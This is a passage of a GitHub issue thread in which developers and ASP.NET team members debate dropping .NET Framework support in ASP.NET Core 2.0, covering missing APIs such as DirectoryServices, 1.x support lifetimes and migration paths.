> Are there features you need in ASP.NET Core 2.0? Or are you just speculating that eventually you'll need to upgrade to the next ASP.NET Core and at that point things won't work on .NET Framework?

I want to move to netstandard2 at some point for reasons. I'll need to move to move my web app to asp.net core 2 for that, right?

> As part of netstandard 2.0 lots of work was done identifying important APIs to bring back so that libraries that targeted .NET Framework were for the most part binary compatible with it. <...>

Sure, and I like what's being done with netstandard, but if something was missing from netstandard you can work around because you can target full framework in applications that need it. We now have a handful of pure netstandard 1.3 libraries (our source) shared across: Xamarin.iOS, Xamarin.Android, net46, Asp.net core 1.1 - because we can suppliment missing funtionality in netstandard with specific framework targetting libraries, including net46 stuff in our asp.net core web app.

The _**only**_ reason we have these netstandard libraries is because we needed to port our huge web application (as I mentioned previously). I would _like_ to not have to expand our platform specific code base for other platforms, and instead keep moving up the netstandard chain. I really don't want to be stuck on netstandard 1.3 because there is no path to move to asp.net core 2."
412	"> Active fixes for issues - will 1.x receive fixes for all the things we break, or will we be told to upgrade for a fix in some cases? (note: that's an upgrade we can't do until our libraries like DirectoryServices are there...and even if we can it's nowhere close to a free or even cheap, it's likely months at a minimum). We're big, we're fast, we will find breaks in the framework. We have for every major and minor release for years. Support is critical to us.

I don't think there's an issue with support. I actually don't think this would be a huge problem and if it made people feel more confident in taking a bet then maybe it's worth extending support for 1.x to a longer timeframe.

> Nope, I want a version that works and a path forward. With 1.x, we only have the first half. Until this issue, the second was kind of assumed.

It just means you need to stay on 1.x until all of your dependencies are ported no?

@NickCraver All of your complaints are talking about things missing on .NET Core rather than ASP.NET Core. In .NET Core 1.x and ASP.NET Core 1.x those 2 entities ship together but are completely decoupled. I haven't heard a single reason for wanting to use ASP.NET Core 2.0 specifically other than valid concerns about v1 supporting something and v2 not supporting it. I think we'd be having the exact same discussion in a year if there was another reason you weren't able to port to .NET Core only (maybe during the development of ASP.NET Core on full framework you took some new dependencies that will never be ported as an example).

> Then no offense, but why not just say that and close the issue? That statement seems like there's nothing more to discuss, and our time is better spent elsewhere. If that's not the case, please clarify?

I'm here answering and replying because I'm trying to figure out why we need to support .NET Framework if so, for how long. I'm still getting a mixed vibe on this thread about those time frames. Also there's a general fear I can understand about being ""relegated to ASP.NET Core 1.x"" but nothing concrete in terms of specific features that are needed in 2.x. 

One of the major things I like about coupling .NET Core and ASP.NET Core is that it solves some of the versioning and naming madness. Lots of people don't even know ASP.NET Core runs on .NET Framework (it even confuses new comers to the stack). That said, we have lots of customers with lots of different needs and we listen to their feedback."
413	"@mythz 

> I've been anxiously expecting .NET Standard 2.0 was destined to provide the much sought after highly compatible surface area and much needed stability.

Sure, but like I said, ASP.NET Core, .NET Core and .NET Standard in 1.x are completely decoupled. You can use any .NET Standard library on any version of .NET Core that supports it. So if .NET Core 2.0 is a new LTS, we *could* still declare that ASP.NET Core 1.x is supported on it. 

@jahmai

> I want to move to netstandard2 at some point for reasons. I'll need to move to move my web app to asp.net core 2 for that, right?

No, that's not right. You can move to netstandard 2 whenever you want without moving your web app to ASP.NET Core 2.0.

> The only reason we have these netstandard libraries is because we needed to port our huge web application (as I mentioned previously). I would like to not have to expand our platform specific code base for other platforms, and instead keep moving up the netstandard chain. I really don't want to be stuck on netstandard 1.3 because there is no path to move to asp.net core 2.

You don't need to be stuck on netstandard 1.3. The 2 things are unrelated."
414	">When version 1 supports you but version 2 doesn't but _hopefully will someday_, that's a really bad gamble....

This I think is the crux of the issue. We've had comments that _some_ of the gaps (`DirectoryService`, et. al.) are known and will be addressed. We need something  more concrete then that. 

I'm OK with ASP.NET Core targeting .NET Core and with us missing the 2.0 boat if the roadmap is clear on when we can expect these gaps (and which gaps) will be addressed (again, assuming there's enough time to port before 1.X becomes unsupported).

As things currently stand, the issue we're blocked on for WCF has been stagnant since May 2015 and may never get addressed.. Leaving us effectively stranded."
415	"@davidfowl 

> No, that's not right. You can move to netstandard 2 whenever you want without moving your web app to ASP.NET Core 2.0.

Excellent. In that case, as long as Microsoft ensures that 1.x is supported (all kinds of bug fixes and operational support) until it offers customers a proper 2.x migration path (e.g. SignalR), then I am comfortable biding my time until we need asp.net core 2."
416	"> It just means you need to stay on 1.x until all of your dependencies are ported no?

Correct, but that has to be a known timeframe. We have no dates, the only thing we've been told so far is ""not in 2.0""...so that's not good. For example, `System.DirectoryServices` has been requested since Mid-2015, and is still missing yet is often repeated as the most wanted by users (followed by `System.Drawing`). Saying we're bringing .NET Standard 2.0 to ~60% API parity but missing the bits users have asked for most certainly sends mixed signals about what's important.

> All of your complaints are talking about things missing on .NET Core rather than ASP.NET Core.

That is incorrect. I need the bits we *need* to run (e.g. AD auth) on a supported platform. The missing thing is support from the latter. Support for 1.x is certainly my main concern. We have no supported path forward or any timelines for when we can expect one.

> I think we'd be having the exact same discussion in a year

I don't think that's the case. The problem is we couldn't port *today*. The APIs aren't there. As long as there's no single point in time we were even capable of porting, discussions about the future are a bit moot. I would expect .NET full framework support in ASP.NET Core to be deprecated once there was parity and most users could move over. And I'd expect that release to have a long support timeframe for people to move over.

If DirectoryServices, Drawing, etc. are coming in 2.x then awesome. That release should support .NET Framework, and be a LTS release. And 3.x should drop full framework support.

> One of the major things I like about coupling .NET Core and ASP.NET Core is that it solves some of the versioning and naming madness. Lots of people don't even know ASP.NET Core runs on .NET Framework (it even confuses new comers to the stack). That said, we have lots of customers with lots of different needs and we listen to their feedback.

Fair enough, but all of the madness there is secondary to ""does it even work?"". Currently, that's a firm no. ASP.NET and .NET Core/Standard/whatever may be 2 sets of things inside Microsoft (and I totally get that), but to developers it's still 1 platform. The ASP.NET Side needs the APIs to be useful to many, and they're not there yet. This move further cuts down on the available APIs. The ASP.NET team may get the ones they want, but it's at the expense of the ones we need."
417	"@ctolkien @NickCraver 

> This I think is the crux of the issue. We've had comments that some of the gaps (DirectoryService, et. al.) are known and will be addressed. We need something more concrete then that.

> Correct, but that has to be a known timeframe. We have no dates, the only thing we've been told to far is ""not in 2.0""...so that's not good. For example, System.DirectoryServices has been requested since Mid-2015, and is still missing yet is often repeated as the most wanted by users (followed by System.Drawing). 

These gaps are related to .NET Core itself though and I can understand the anxiety not knowing when those dependencies will be available and that's why helping us prioritize these would be good. The good news is that netstandard 2.0 and netcoreapp2.0 laid the group work to make of other libraries easier to port. I expect that after once we ship 2.0, it'll be much easier to bring up other dependencies by porting swaths of code on top of our very compatible base."
418	Will [CSOM](https://www.nuget.org/packages/Microsoft.SharePointOnline.CSOM) run in netcore 2? That would be a huge blocker for us and one area that I haven't heard anything​ on.
419	"@davidfowl I sincerely hope that's the case too, but I'm not betting our company on it. Dropping support before that happens, and not after, I strongly disagree with. I think this happening in the 3.x time frame *after* those critical APIs for many consumers are in place is totally valid. Doing so before they're ready just halts our adoption. 

I was on the path to adopting 1.0 *assuming* that 2.x (or whatever's actively developed/fixed) would support full framework until those critical APIs were ready (I'm being serious - you know how much work I've put into libraries already). But at this point, I can't do that at Stack...it was a bad assumption. I cannot in good conscience tell our teams to use .NET Core while the future of any port is so uncertain. I really wish I could, but it's not worth the risk and the pain at the moment."
420	"@NickCraver 

> I would expect .NET full framework support in ASP.NET Core to be deprecated once there was parity and most users could move over. And I'd expect that release to have a long support timeframe for people to move over.

What's the measure of ""most users"" here? What's the list of dependencies that need to be covered until we can drop support? Your list is different from other users on this list. I also expect some people will say forever or until .NET Core reaches .NET Framework parity (which is just unrealistic). I'll still pose that ASP.NET Core 1.x is good enough for that purpose and we *should* look at extending support for that until said time.

> That is incorrect. I need the bits we need to run (e.g. AD auth) on a supported platform. The missing thing is support from the latter. Support for 1.x is certainly my main concern. We have no supported path forward or any timelines for when we can expect one.

What ASP.NET Component is missing for this scenario? When you say 1.x vs 2.x it would be useful if you mention ASP.NET Core vs .NET Core. 

> If DirectoryServices, Drawing, etc. are coming in 2.x then awesome. That release should support .NET Framework, and be a LTS release. And 3.x should drop full framework support.

I mentioned this before, what ASP.NET Core features do you need that ASP.NET Core 1.x isn't sufficient for this?

> ASP.NET and .NET Core/Standard/whatever may be 2 sets of things inside Microsoft (and I totally get that), but to developers it's still 1 platform

Agreed but we need to clear up the FUD on this discussion so that we can properly evaluate the impact. ASP.NET Core 1.x targets .NET Standard 1.x (1.0 - 1.6) and .NET Framework 4.5.1. This means it can run on any platform that supports those versions of netstandard and .NET Framework. It means that ASP.NET Core 1.x will run on .NET Core 2.0.
"
421	"@smbecker 

> Will CSOM run in netcore 2? That would be a huge blocker for us and one area that I haven't heard anything​ on.

I have no idea what that is. Is it this https://msdn.microsoft.com/en-us/library/ff798388.aspx? If so there was no work done to explicitly support it. It might just work based on the .NET Framework compatibility in .NET Core 2.0 but my guess is that it will never be ported to .NET Core (just based on my 5 minutes of looking at it), but I could be wrong."
422	"> What's the measure of ""most users"" here? What's the list of dependencies that need to be covered until we can drop support? Your list is different from other users on this list. I also expect some people will say forever or until .NET Core reaches .NET Framework parity (which is just unrealistic). I'll still pose that ASP.NET Core 1.x is good enough for that purpose and we should look at extending support for that until said time.

Let's start with the top missing APIs - those are what cause blocks for the most people. For us, that's DiretoryServices, which is number 1. If that's not even there, it's a really bad sign to the community. I agree lists are different, but if we're not even including **number 1**...

> What ASP.NET Component is missing for this scenario? When you say 1.x vs 2.x it would be useful if you mention ASP.NET Core vs .NET Core.

> I mentioned this before, what ASP.NET Core features do you need that ASP.NET Core 1.x isn't sufficient for this?

I mean support for the latest ASP.NET Core that supports Full Framework (and therefore the libraries I need). I *hope* that's 2.x, as we want modules, razor pages, etc. We have uses for a lot of 2.x features. But it sounds like our only option is 1.x at this point. We can't make the jump from ASP.NET 5 to ASP.NET Core and from full framework with all our working libs to `netcoreapp` in 1 move. It's too much. It's too costly. It's too risky. And now we're unsure if we can do that expensive, risky move inside a support window. That's a bad situation - so bad that it's better to not move (as things stand today). I think that's really unfortunate."
423	"> What ASP.NET Component is missing for this scenario? When you say 1.x vs 2.x it would be useful if you mention ASP.NET Core vs .NET Core.

- Unless  there's a way to handle AD authentication/queries through some Microsoft.Authentication.* NuGet package, then that's one big thing. I'm currently in that same boat, but since I'm running .NET Core 1.1 on top of .NET 462, I'll be able to pull that off. Outside of that, how would I be able to query any AD groups, metadata through supported means? I have seen in the corefx repo that there IS a lot of work happening on `System.DirectoryServices` though, so I'm happy about that at least. 

- `System.Data.Common.DbDataAdapter`/`SqlClient.SqlDataAdapter`. Currently, I'm only able to access that when running on .NET Core on top of the full .NET Framework. I guess it's more of a convenience thing, since I can still use the `DbDataReader`/`SqlDataReader`.

Basically I need to know that there will be a guarantee of SOME supported way to handle AD Authentication while using ASP.NET Core 2.x, without the need of the full .NET Framework. "
424	"I've been thinking about this a lot today and I'm finding that my concerns are different than most of those here (not that those concerns aren't just as important, if not more so).

I'm still kind of stuck on the use case of consuming ASP.NET Core packages on `netstandard`. Up until this issue I had assumed (perhaps wrongly) that `netstandard` was the de-facto target for libraries. In other words, the intended behavior for library authors would be to target `netstandard` unless there was a necessary and compelling reason not. This ensures not just compatibility with Framework but the other platforms like Xamarin and UWP. The work on .NET Standard 2.0 seemed to support this by trying to unify the API surface area of the various runtimes into a common don't-need-to-think-about-it target.

To me, this change signals something different. Granted, at the end of the day ASP.NET Core is just a library and perhaps it does have ""necessary and compelling reasons"" not to support the common `netstandard` surface area. But it's also one of the most visible Microsoft-developed .NET libraries and by saying ""we want the latest and greatest so we're going to stop supporting `netstandard`"" it signals to all the other library developers (or at least it does to me) that maybe they should stop trying so hard to support `netstandard` and just start targeting the Core runtime. Why bother with all that compatibility stuff when Microsoft doesn't even care that much about it? .NET Core 4 lyfe. And maybe that's for the best - it's certainly different than where I thought we were going with multiple runtimes and a mostly unified API surface area though.

This concern gets even deeper when considering that ASP.NET Core contains many, many libraries that are useful outside the context of ASP.NET directly. Maybe it was wrong to assume that those were ever intended to be used in isolation, but it would be an awful shame to loose them. Library authors who want to use them will have to decide to switch their own targeting to .NET Core as well or stay on `netstandard` and loose access to them. I suspect many will choose the former, further splintering library support for alternate platforms. At least if I've understood the comments here that targeting different platforms for the supporting libraries is too difficult.

Finally, I'm somewhat (though a little less) concerned about the comments here that as soon as it's possible new APIs will be added to Core to rev in conjunction with ASP.NET. Particularly that those new APIs may not ever make it into `netstandard` or .NET Framework. I certainly understand that there may be some exciting stuff that can be done if the legacy and compatibility concerns are dropped or loosened. But to be frank, I've gotten the impression that the ASP.NET Core team is often out there charging ahead. That's not necessarily a bad thing, but it's also led to a number of broader descisions that have had to be walked back. I can't help but wonder if this, and the subsequent rapid evolution of the Core runtime, will have the result of greatly fracturing the set of runtimes over time (and again, it's not just Windows/Framework that will be left behind - there's also Xamarin, Mono, UWP, etc.).

This whole thread has caused me to reorient my understanding of the future of .NET around .NET Core instead of `netstandard`. Maybe I'm being extreme and that'll soften in the coming weeks, or maybe that's even the intended position and it's all for the best - either way, I'm currently tempted to just go out and target .NET Core for my own stuff and only focus on that going forward from everything I've read here."
425	"@NickCraver 

> I mean support for the latest ASP.NET Core that supports Full Framework (and therefore the libraries I need). I hope that's 2.x, as we want modules, razor pages, etc. We have uses for a lot of 2.x features.

Right now it's 1.1.1 (there's no modules in 2.0), Razor Pages is a good one, another is SignalR. Those are the 2 things I see being the most painful as part of this. 

> We can't make the jump from ASP.NET 5 to ASP.NET Core and from full framework with all our working libs to netcoreapp in 1 move. It's too much. It's too costly. It's too risky. And now we're unsure if we can do that expensive, risky move inside a support window. That's a bad situation - so bad that it's better to not move (as things stand today). I think that's really unfortunate.

Is it though? The move from ASP.NET Core 1.x to 2.x or 3.x assuming your dependencies  have been ported would be trivial.  If you plan on moving to ASP.NET Core in general, moving to 1.1 is a good first step and you won't be saving any work avoiding it."
426	"@snickler 

> Basically I need to know that there will be a guarantee of SOME supported way to handle AD Authentication while using ASP.NET Core 2.x, without the need of the full .NET Framework.

Until System.DirectoryServices is supported on .NET Core then is there a reason you can't use ASP.NET Core 1.x on .NET Framework?"
427	"> Until System.DirectoryServices is supported on .NET Core then is there a reason you can't use ASP.NET Core 1.x on .NET Framework?

That's what I'm currently doing. I'm just looking forward in hopes that I can not have to worry about the .NET Framework if I don't need to. Currently, it restricts me to my Windows machine as the `System.DirectoryServices.AccountManagement` namespace doesn't exist in Mono. In those same regards, will there be `System.DirectoryServices.AccountManagement` available outside of the constraint of Windows? That one little piece forces me to jump between machines while debugging my MVC project and my Xamarin.iOS app locally."
428	"> If you plan on moving to ASP.NET Core in general, moving to 1.1 is a good first step and you won't be saving any work avoiding it.

I totally agree, *if we knew support was there until we upgraded to another platform that worked*. Right now, we don't know when the necessary bits will be available in the .NET Core world so setting a time cap *now* and not knowing when those bits will come *later* is me betting on a promise. That's the core issue. If we have a supported, overlapping release that allowed porting then I'd be all set and happy to invest. If support is dropped before the APIs are there, we're jumping a gap on faith, with an unknown amount of runway.

I keep referencing DirectoryServices because that's what I *know* doesn't work on `netcoreapp2.0` today. There will of course be other things we find that fall in the same boat. We need ASP.NET Core + full framework + support for several years on some platform. With 1.x, we don't get a lot of gains, we actually get very little. Performance isn't an awesome argument since we already render pages in ~18ms and it's dwarfed by transport time. 2.0 however, offers quite a few good items. Razor pages and the prospect of plugins makes it very appealing to port to. So much so as to be justifiable.

Right now, the only version to go to with support (1.1.x with longer support, is what I expect after reading this thread) isn't worth moving to. It'd basically be a lot of time and effort to get to where we are today. 2.x at least offers some decent improvements and bits we'd want to take advantage of. They help justify the cost of moving."
429	"> Performance isn't an awesome argument since we already render pages in ~18ms

On a minor OT rant, I'd like to know how you're able to render pages in ~18ms @NickCraver . That's awesome "
430	"@daveaglick 

> I'm still kind of stuck on the use case of consuming ASP.NET Core packages on netstandard. Up until this issue I had assumed (perhaps wrongly) that netstandard was the de-facto target for libraries. In other words, the intended behavior for library authors would be to target netstandard unless there was a necessary and compelling reason not. This ensures not just compatibility with Framework but the other platforms like Xamarin and UWP. The work on .NET Standard 2.0 seemed to support this by trying to unify the API surface area of the various runtimes into a common don't-need-to-think-about-it target.

Nothing has changed here. In fact a bunch of our libraries that we want to run on other platforms *are* still netstandard. If you re-read some of the above:

- Microsoft.Extensions.* (Logging, DI, Configuration, FIleProviders etc)
- EntityFramework
- SignalR clients (they need to run on .NET Framework, Xamarin, UWP etc).

.NET Standard is the defacto way to write libraries that run everywhere. Library authors should aim to target netstandard where possible to get the broadest platform reach. Library authors have to decide if they want to have reach or not. That's why libraries like JSON.NET support netstandard1.x and .NET framework 2.0. They go the extra mile to make things ""just work"" as @JamesNK mentioned above.

ASP.NET Core moving away from netstandard in some places is more of a statement that these APIs aren't meant for UWP applications and we certainly don't test them there (as an example). It also tries to solidify that .NET Core and ASP.NET Core are a single product that versions together (since it has Core in the name). With ASP.NET Core 1.x supporting both .NET Core and .NET Framework that message was a little blurry and it causes confusion for lots of people  (especially new developers) and we did it to ease the library gap problem. 

> This concern gets even deeper when considering that ASP.NET Core contains many, many libraries that are useful outside the context of ASP.NET directly. Maybe it was wrong to assume that those were ever intended to be used in isolation, but it would be an awful shame to loose them. Library authors who want to use them will have to decide to switch their own targeting to .NET Core as well or stay on netstandard and loose access to them. I suspect many will choose the former, further splintering library support for alternate platforms. At least if I've understood the comments here that targeting different platforms for the supporting libraries is too difficult.

I'm guessing those are still netstandard. Which ones aren't?

> I can't help but wonder if this, and the subsequent rapid evolution of the Core runtime, will have the result of greatly fracturing the set of runtimes over time (and again, it's not just Windows/Framework that will be left behind - there's also Xamarin, Mono, UWP, etc.).

I think netstandard **will** evolve, but .NET Framework will always be the last to get new APIs (Xamarin and Mono are pretty fast to add things). "
431	"@snickler 

> That's what I'm currently doing. I'm just looking forward in hopes that I can not have to worry about the .NET Framework if I don't need to. Currently, it restricts me to my Windows machine as the System.DirectoryServices.AccountManagement namespace doesn't exist in Mono. In those same regards, will there be System.DirectoryServices.AccountManagement available outside of the constraint of Windows? That one little piece forces me to jump between machines while debugging my MVC project and my Xamarin.iOS app locally.

Make sure you file issues like that on dotnet/corefx. Assuming your dependencies will be ported (unless it's wildly popular) is the wrong thing to do."
432	@davidfowl Question: I want to File -> New Project with ASP.NET Core 2.0 and authenticate against AD. Will this be possible? I simply cannot imagine a Microsoft platform shipping without the ability to do this.
433	"> Agreed with everything there but I don't see how this decision affects anything you said. I want all of those same things

By dropping support for .NET v4.x it will kill a popular migration path and fragment the .NET ecosystem even further and prevent many devs and organizations from being able to adopt it which will reduce the wider community pool of knowledge and investment in ASP.NET Core since many .NET devs will need to support their existing ASP.NET v4.x code-bases indefinitely (which they get paid to work on full-time). 

The smaller the market share .NET Core has, the lower priority it will be for library maintainers to support it and some likely never will if they work for an organization who'll no longer be able to consider migrating to ASP.NET Core because of this, which in turn effects anyone else depending on their packages, and so on. These are all side-effects of increasing the burden in adopting ASP.NET Core, by not having a stable platform, long term support guarantees and now killing off a popular migration path. 

I believe everyone here wants the .NET ecosystem to thrive but it appears we're at odds with the MS team on how best to achieve it as I firmly believe dropping .NET v4.x this early on before a known quantity, highly compatible, stable LTS release is available is a mistake that will have detrimental effects for years to come."
434	@davidfowl Thanks - your comment helps a lot. I had (apparently incorrectly) gathered that most/all the supporting libraries were moving off of `netstandard` as part of this change. I use quite a few, and know others who do as well, so hearing that they aren't is welcome news.
435	@NickCraver what kind of auth are you using against AD today? OpenIdConnect, WsFed, NTLM, other?
436	@Tratcher AD auth, via DirectoryServices (we need to query group membership, etc. - the standard bits)
437	@mythz I think that's reasonable and I think extending the support lifetime of ASP.NET Core 1.x would be sufficient to cover most of the cases. 
438	"I see why you have to make this decision at some point but I too believe it's premature and would be happiest with:
* ASP.NET Core 2.x being LTS and last to support Full Framework (surely since we were already in preview you are not too far gone) with also SignalR following later in the year supporting it so that it's the target framework for making the jump from ASP.NET to ASP.NET Core
* 3.x dropping support for Full Framework and being released when top dependencies are migrated over

Simply extending support for ASP.NET Core 1.1 in my view would not be enough as that platform is not mature/adopted enough to be a target for many ASP.NET migrations (in my case SignalR being the blocker)."
439	"Just for the lulz, I tried using EntityFramework 6 - that I've seen massively used in ASP.NET Core 1.0 apps I've worked on - with the latest preview2 .NET Core nightly builds. Guess what...

```xml
<Project Sdk=""Microsoft.NET.Sdk"">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>netcoreapp2.0</TargetFramework>
    <NetStandardImplicitPackageVersion>2.0.0-*</NetStandardImplicitPackageVersion>
    <RuntimeFrameworkVersion>2.0.0-preview2-002093-00</RuntimeFrameworkVersion>
    <PackageTargetFallback>net45;net461</PackageTargetFallback>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include=""EntityFramework"" Version=""6.1.3"" />
    <PackageReference Include=""System.Configuration.ConfigurationManager"" Version=""4.4.0-*"" />
  </ItemGroup>

</Project>
```

![image](https://cloud.githubusercontent.com/assets/6998306/25787824/0d60e716-33a5-11e7-8362-d1f305396d5d.png)

Stop pretending assemblies designed and compiled for the full framework will work flawlessly on .NET Core: trivial cases (read hello world apps) will probably work, but in many cases, you'll end up being blocked by missing APIs or non-functional APIs.

What's absolutely terrible is that you'll only realize it doesn't work at runtime. In some cases, it won't even be obvious at all. For instance, .NET Core's `SqlClient` doesn't support ambient transaction enlistment nor distributed transactions with `TransactionScope`: even if you find a way to make EF 6 work, your `TransactionScope`s won't be effective at all and your DB calls won't use the isolation level you need."
440	"I feel it necessary to add my two cents here as far as my concerns with this move. We have a desktop application that is primarily Windows Forms with some of the newer areas developed in WPF. There is over 15 years of effort in that application and it will take years to move completely away from WinForms. I wish that weren't the case but it is. We have been working to build more modularity into the codebase so that we can consume the business and data access layers across a newer web interface and the existing WinForms application. I intended to move to ASP.NET Core for our newer web application very soon but as I just stated I will need to consume a large majority of our existing codebase that is targeting .NET v4.6.x. I know for sure we are using System.Drawing and System.Security.Cryptography. We also make heavy use of TransactionScope in ways mentioned above.

I have been greatly looking forward to gaining some of the benefits of ASP.NET Core like the ability to encapsulate areas of our web application into separate assemblies without needing to rely on MEF to bring it all together. There are many additional reasons but that one is the thing that makes it really nice. However, if I transition our application to ASP.NET Core I'll likely be stuck on 1.x for the foreseeable future because we have to maintain portability on our backend code with WinForms. I've been focused primarily on the Web product so I can't tell you where we are hooking into things like WMI, etc, and if it impacts the question of portability, but I know we are within our codebase. We are in a really interesting phase right now and the last thing I want to have to do is develop all the Web versions of our features onto ASP.NET MVC 5 and accrue a bunch of new legacy code that will need to be ported at some future endeavor.

I'm sure we're going to have a lot of usages that are going to keep us away from targeting .NET Standard even if/when we no longer use WinForms. We're a Microsoft Partner and we work directly with Microsoft for our product in several ways so I don't want to go into too much detail as to what we do here but I'd be happy to have a more private discussion with @shanselman or @davidfowl if you need more details into what we are doing. I'm also going to be at MS Build and could meet and talk to either of you there if you will be present.

I think you have not considered companies using your stack with these kinds of challenges. However, full disclaimer: I do intend to run the portability analyzer mentioned earlier to see where we are indeed stuck because of the need to maintain that portability within our codebase. I'll gladly provide you with a list of any .NET Framework APIs that fail that check."
441	"Mouahaha. Not sure if I should laugh or cry...

Here's the report generated by the ApiPort analysis tool for my trivial 23-line EF 6 app that doesn't work:

![image](https://cloud.githubusercontent.com/assets/6998306/25788342/aea07166-33a8-11e7-8446-31fa415e3559.png)
"
442	"> Cross-compiling is an overhead that must be balanced with customer and product needs. This is why we want to get this feedback so we can more concretely define what the landscape looks like for both our customers and us as we continue to evolve ASP.NET Core moving forward.

Prior to this issue being opened, was there a feedback process?"
443	"We're all talking about time frames and support for 1.1 but the fact that ASP.NET Core is going to drop full framework at all has come as a huge surprise to me.

My understanding was that the core framework was a cross platform play, a new framework that's made up of a **subset of the full framework** that isn't coupled to Windows. The 2.0 release was the one we've all been waiting for where we get most of the API's back.

ASP.NET Core was the dog food for this new framework, a new web framework which depended on such a small surface area of framework API's that it could run everywhere.

I was expecting that once the core framework made close parity with the full framework all new API's would be added to netstandard and eventually make it into both frameworks. We would all start targeting netstandard and everything would be rainbows an unicorns.

Now to find ASP.NET won't even dogfood netstandard and are going framework specific eh :/"
444	"@rohatsu
> Simply extending support for ASP.NET Core 1.1 in my view would not be enough as that platform is not mature/adopted enough to be a target for many ASP.NET migrations (in my case SignalR being the blocker).

What if SignalR worked on ASP.NET Core 1.x? What else is immature about the platform that you need?

"
445	@millman82 Thanks for sharing that. It *does* sound like you would be stuck on the version before  .NET Framework support was dropped for a while. So some of the suggestions here where we keep 2.x compatible and 3.x would drop it might not even work for you. Why not just stay on ASP.NET Core 1.x? What's missing from it that you need in your port? Or is it just the concern the same as @NickCraver 's (that 2.x not supporting it makes you nervous about taking a bet on it).
446	"@jkells 

> I was expecting that once the core framework made close parity with the full framework all new API's would be added to netstandard and eventually make it into both frameworks. We would all start targeting netstandard and everything would be rainbows an unicorns.

That's not far fetched, it's just missing the time component. Will eventually make it into all framework that each ship on their own schedule.

> Now to find ASP.NET won't even dogfood netstandard and are going framework specific eh :/

Part of it still targets netstandard as was mentioned several times in this thread."
447	">Why not just stay on ASP.NET Core 1.x? 

You can't - it's out of support 1 year from when 2.0 drops (assuming 2.0 is the next LTS).

"
448	"@davidfowl It is definitely a large part of that. We also use OData and SignalR in our current web application and that needs to be in ASP.NET Core before we can move over. However, the one thing I don't want to happen is to be stuck in limbo when support for ASP.NET Core 1.x is dropped and there is no migration path with the framework parts we are using that aren't currently supported. I foresee ASP.NET Core replacing ASP.NET wholesale. It may be somewhere on down the road but it is coming. Knowing that I'd hate to rewrite our UI now in ASP.NET MVC 5 (we have a few things there now but it is easy to move because it is small) only to a few years later rewrite it again in ASP.NET Core once the end of life for ASP.NET arrives.

We could potentially be setting ourselves up to get burned badly if that migration path is nonexistent when EOL of ASP.NET Core 1.x does arrive if it is extended in the interim if we target Core 1.x now. We could probably navigate around some of it with micro services, however, that of course has its own concerns."
449	"@ctolkien 

> You can't - it's out of support 1 year from when 2.0 drops (assuming 2.0 is the next LTS).

Assume for a second that it isn't out of support when 2.0 drops. Isn't that enough?"
450	">  However, the one thing I don't want to happen is to be stuck in limbo when support for ASP.NET Core 1.x is dropped and there is no migration path with the framework parts we are using that aren't currently supported

Replace 1.x with 2.x in that sentence. Do you think that in a year all of your dependencies would be ported? 
"
451	"> Replace 1.x with 2.x in that sentence. Do you think that in a year all of your dependencies would be ported?

Not at all, however, I'd expect that when no longer able to target .NET Full they would be. I understand why you would want to push that up but I don't think you can expect companies to adopt something that will fall out of support with no means of transitioning to a newer version because the missing dependencies haven't been ported."
452	"> I don't think you can expect companies to adopt something that will fall out of support with no means of transitioning to a newer version because the missing dependencies haven't been ported.

Why would it fall out of support? In my hypothetical world we'd be supporting ASP.NET Core 1.x on .NET Framework for longer."
453	"> Why would it fall out of support? In my hypothetical world we'd be supporting ASP.NET Core 1.x on .NET Framework for longer.

My question is how much longer? Also, is the team large enough to bring those necessary dependencies like SignalR and OData to ASP.NET Core 1.x and maintain support until all those missing dependencies have, in fact, been ported? Seems like it counters the arguments made earlier about why you would want to drop .NET Full support now. Honest question..."
454	"> My question is how much longer? Also, is the team large enough to bring those necessary dependencies like SignalR and OData to ASP.NET Core 1.x and maintain support until all those missing dependencies have, in fact, been ported? Seems like it counters the arguments made early about why you would want to drop .NET Full support now. Honest question...

I'll throw out a random number, 3 years. The ASP.NET Team doesn't own the Odata integration, the odata team does so I cant answer for them. As for SignalR, I think it would be possible to target ASP.NET Core 1.x.

The problem I see is that each person has a different set of ""missing dependencies"" which makes it impossible to reason about when it's even ""ok"" to drop .NET Framework support for everyone. It's also likely that some of those dependencies may never be ported (like CSOM).
Of course being on the 1.x train you'll get bug fixes and minor features but the bulk of the work would still be happening in the latest major of ASP.NET Core. 

Also none of this prevents you from using .NET Core 2.0 or .NET Standard 2.0 with ASP.NET Core 1.x. I just want to make sure everyone is aware of that because this threads constant conflates ASP.NET Core with .NET Core (which is one of the reasons we want to target .NET Core only)."
455	"> The problem I see is that each person has a different set of ""missing dependencies"" which makes it impossible to reason about when it's even ""ok"" to drop .NET Framework support for everyone.

Engage the eco system to find out what the list is (no, this issue is not the place to do it). If it's a Microsoft owned dependency, port it. If it's not, engage with the owner to inform them of the plans and assist with a migration guide (if they don't do anything, not Microsoft's fault). In the time it takes to go through this process, support ASP.net core 1.x. I can't see any other way to achieve your goals without upsetting lots of folks. This is a big thing being proposed that needs a high level of care and attention to do right."
456	"Personally, I think there is far more confusion around .NET Framework vs .NET Standard vs .NET Core. When I saw I could target .NET Framework I never said, ""but this is ASP.NET Core so why can I use .NET Framework"". The distinctions between the above are far more confusing for most of your customer base. I love everything ASP.NET Core is doing. Also love the direction with .NET regarding platform independence. I just think the domain of confusion is incorrectly stated. I'd say the majority of your user base is going to have some amount of code that isn't portable due to the nature of what it is doing and the APIs it is targeting within the Framework.

My preference would be to work toward API parity within .NET Core and .NET Standard and .NET Framework. Also, figure out which is the one people should strive to target. As I believe was stated earlier, perhaps in a slightly different way, .NET Standard feels like a bandaid. Eventually, I'd expect .NET Core to be the only ""framework"" option and when that happens .NET Framework and .NET Standard go by the wayside. Myself, and I think with most whom have spoken up since the announcement, would like to be able to continue to benefit from the work you are doing on the ASP.NET Core side without having the freedom of what they are executing their code on top of being removed.

I think the cases being considered as exceptional, like mine where I have a dependency on things like WMI are not as exceptional as the team may think. Again, I'll do the research and see what is missing (though the post earlier giving incorrect portability results has me a little concerned over the accuracy) and I will gladly report that to you in a more private medium.

Bottom line, we're passionate about this because we want to use it."
457	"> Personally, I think there is far more confusion around .NET Framework vs .NET Standard vs .NET Core. When I saw I could target .NET Framework I never said, ""but this is ASP.NET Core so why can I use .NET Framework"". The distinctions between the above are far more confusing for most of your customer base. I love everything ASP.NET Core is doing. Also love the direction with .NET regarding platform independence. I just think the domain of confusion is incorrectly stated. I'd say the majority of your user base is going to have some amount of code that isn't portable due to the nature of what it is doing and the APIs it is targeting within the Framework.

